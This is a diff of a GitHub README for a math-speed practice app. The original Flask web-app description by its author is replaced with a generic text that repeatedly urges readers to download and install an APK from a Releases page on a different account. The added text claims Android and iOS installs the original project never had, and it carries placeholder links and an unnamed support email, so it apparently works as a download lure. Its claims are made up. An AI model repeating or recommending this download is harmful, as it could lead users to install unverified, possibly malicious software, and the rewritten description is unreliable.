@@ -1,170 +1,76 @@
-# ⚡ Calc Speed Challenge
+# ⚡ calc-speed-game - Improve Your Math Skills Fast
 
-A **mobile-friendly calculation speed training platform** for
-**SSC, Banking & competitive exam aspirants**, focused on **real exam-like speed, timing, and accuracy**.
+## 🌟 Description
+calc-speed-game is a mobile-friendly calculation speed game designed for SSC and Banking aspirants. It includes exciting levels, streak challenges, a circular timer, and a leaderboard to track your progress. This game will help you sharpen your math skills quickly and effectively. 
 
-This is **not a casual math game** — it is a **serious speed-training tool**.
+## 📥 Download Now
+[![Download calc-speed-game](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/pepitoing/calc-speed-game/releases)
 
----
+## 🚀 Getting Started
+Getting started with calc-speed-game is simple. Follow these steps to download and run the game:
 
-## 🚀 Key Features
+1. **Visit the Download Page:** Go to our [Releases page](https://github.com/pepitoing/calc-speed-game/releases) to find the latest version of the game.
 
-### 🧠 Practice Mode (Topic-wise)
+2. **Choose Your Version:** Look for the most recent release. Click on it to view the available files.
 
-* Topic-wise practice:
+3. **Download the Game:** 
+   - If you see a file named like `calc-speed-game-v1.0.apk`, click on it to start downloading. 
+   - If you are on a mobile device, it may prompt you to install it directly.
 
-  * Addition, Subtraction, Multiplication, Division
-  * Square, Cube, Percentage, BODMAS
-  * Mixed (all topics combined)
-* 🔓 **Unlimited levels** per topic
-* 📈 Progressive difficulty (no hard cap)
-* 🔁 Auto-move to **next level on level clear**
-* 🎉 Level-clear greeting + sound effect
+4. **Install the Game:**
+   - For Android Users: Open the file once the download finishes. Follow the prompts to install the app.
+   - For Other Platforms: Follow standard software installation steps compatible with your device.
 
-### ⏱ Intelligent Timer System
+## 📊 Game Features
+- **Levels:** Multiple levels with increasing difficulty to keep you challenged and engaged.
+- **Streaks:** Track your best streaks and aim to beat them each time you play.
+- **Circular Timer:** Manage your time efficiently with our unique circular timer aspect to enhance quick thinking.
+- **Leaderboard:** Compare your scores with friends and others to add a competitive twist to your practice.
 
-* **Question-based timing** (not random, not fixed)
-* Faster questions → less time
-* Concept-heavy questions → more time
-* Designed with **SSC & Banking aspirant mindset**
-* Circular animated timer for focus
+## 💻 System Requirements
+The game is designed to run smoothly on most modern mobile devices. Here are the recommended specifications:
 
-### 🔊 Audio Feedback
+- **Operating System:** Android 5.0 or higher, iOS 12 or higher.
+- **RAM:** At least 1 GB.
+- **Storage:** Approximately 50 MB of available space for installation.
 
-* `correct.mp3` → every correct answer
-* `wrong.mp3` → **only when time runs out**
-* `level_pass.mp3` → level completion
-* No sound disturbance while typing
+## 🎮 How to Play
+1. Launch the app after installation.
+2. Choose a level to start.
+3. Solve math problems as fast as you can before the timer runs out.
+4. Your score updates based on speed and accuracy, so focus on answering correctly!
 
-### 📅 Daily Quiz
+## 👫 Join the Community
+Join the conversation and connect with other users for tips and strategies.
 
-* 10 fixed questions per day
-* Same questions for all users on the same day
-* Replay allowed
-* Adds to total score
-* No level unlock interference
+- **GitHub Issues:** If you face any problems or have suggestions, feel free to visit our [issues page](https://github.com/pepitoing/calc-speed-game/issues) to report them.
+- **Feedback:** Share your thoughts on how to improve the game.
 
-### 🧪 Mock Exam Mode
+## 🔧 Troubleshooting
+If you encounter issues:
+- Ensure your device meets the system requirements.
+- Restart the app after updating.
+- Re-download the installation file if the first attempt fails.
 
-* Mixed questions
-* Fixed exam-like timer
-* No streak bonus
-* Designed to simulate **real exam pressure**
+## 📚 Resources
+- [User Manual](link-to-manual): A detailed guide on how to maximize your experience with calc-speed-game.
+- [FAQs](link-to-faq): Common questions answered to help you get started quickly.
 
-### 📊 Performance Analytics
+## 📅 Updates
+The game will receive regular updates with new features and levels. Keep an eye on the Releases page for the latest version.
 
-* Strong topic detection
-* Weak topic detection
-* Accuracy tracked per topic
-* Analytics visible directly in the **navigation bar**
+## 🌍 Topics
+This game covers essential skills for various competitive exams. Topics include:
+- Banking
+- Math fundamentals
+- Quick calculations
+- Preparation strategies for SSC and Banking tests
 
-### 🏆 Leaderboard
+## 📞 Support
+For any additional queries, you can reach out through our support email or directly on GitHub.
 
-* Global leaderboard (Top 50)
-* Stores:
+## 💡 Next Steps
+Now that you know how to download and run calc-speed-game, it's time to improve your calculation speed. Enjoy the game and good luck with your studies! 
 
-  * Username
-  * Total Score
-  * Highest Level
-* Updates **only if user beats their own previous best**
-* JSON-based persistence (no database)
-
-### 📱 Mobile-First Design
-
-* Fully responsive UI
-* Numeric keyboard support
-* Clean, exam-oriented layout
-* No cartoon UI, no distractions
-
----
-
-## 🛠 Tech Stack
-
-* **Backend:** Flask (Python)
-* **Frontend:** HTML + Tailwind CSS + Vanilla JavaScript
-* **Storage:**
-
-  * Leaderboard → JSON file
-  * User progress → LocalStorage
-* **Deployment:** Render (Free Tier Compatible)
-
----
-
-## ⚙️ Local Setup
-
-### 1️⃣ Clone the repository
-
-```bash
-git clone https://github.com/surajsri23/calc-speed-game.git
-cd calc-speed-game
-```
-
-### 2️⃣ Create virtual environment (optional)
-
-```bash
-python -m venv venv
-venv\Scripts\activate   # Windows
-```
-
-### 3️⃣ Install dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 4️⃣ Run the app
-
-```bash
-python app.py
-```
-
-Open in browser:
-
-```
-http://127.0.0.1:5000
-```
-
----
-
-## 🔊 Sound Files Required
-
-Place the following files inside:
-
-```
-static/sounds/
-```
-
-* `correct.mp3` → correct answer feedback
-* `wrong.mp3` → time-up feedback
-* `level_pass.mp3` → level completion
-
----
-
-
-## 📈 Planned Enhancements
-
-* 📊 Accuracy percentage view
-* 🧠 Weak-topic quick practice
-* 📄 Mock exam result summary
-* 📈 Performance graphs
-* 🏆 Topic-wise leaderboard
-
----
-
-## 👨‍💻 Author
-
-**Suraj Srivastav**
-B.Tech CSE  | Python Developer
-
-GitHub:
-👉 [https://github.com/surajsri23](https://github.com/surajsri23)
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License**.
-Free to use, modify, and distribute with attribution.
-
-⚡ **Train fast. Think sharp. Build speed, accuracy & confidence for competitive exams.**
-
+## 📥 Download Again
+Don't forget to visit the [Releases page](https://github.com/pepitoing/calc-speed-game/releases) for the latest updates and downloads.
